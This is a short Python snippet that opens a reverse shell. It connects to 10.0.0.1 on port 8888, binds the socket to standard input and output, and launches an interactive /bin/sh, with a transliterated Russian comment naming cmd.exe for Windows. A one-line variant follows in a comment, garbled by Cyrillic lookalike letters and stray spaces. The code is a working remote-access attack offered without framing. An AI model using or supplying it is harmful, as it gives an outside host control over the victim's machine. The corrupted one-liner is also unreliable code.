import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.0.1', 8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i']) #dlya windows - .call('cmd.exe')


#shell odnoy strokoy python -с 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAМ); s.connect(("1О.О.О.1",8888));os.dup2(s.fileno(),О) ; os.dup2(s.fileno(),1); os. dup2 (s. fileno (), 2) ;p=subprocess. call (["/Ьin/sh", "-i"]);'
